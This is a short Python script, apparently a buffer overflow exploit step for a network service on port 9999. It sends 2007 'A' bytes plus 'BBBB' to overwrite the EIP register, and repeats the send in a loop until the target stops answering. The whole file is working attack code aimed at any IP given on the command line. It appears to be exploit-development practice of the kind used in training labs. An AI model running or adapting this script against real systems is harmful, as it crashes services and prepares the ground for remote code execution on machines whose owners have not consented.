import socket
import sys

# how to execute:
# python overflow.py 192.168.1.109 9999

ip = sys.argv[1]
port = int(sys.argv[2])

junk = ("A" * 2007)

eip = "BBBB"

junk = junk + eip

# sending junk
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing: " + str(len(junk)))
        s.send(junk + "\n")
        s.recv(1024)
        s.close()
    except:
        sys.exit(0)
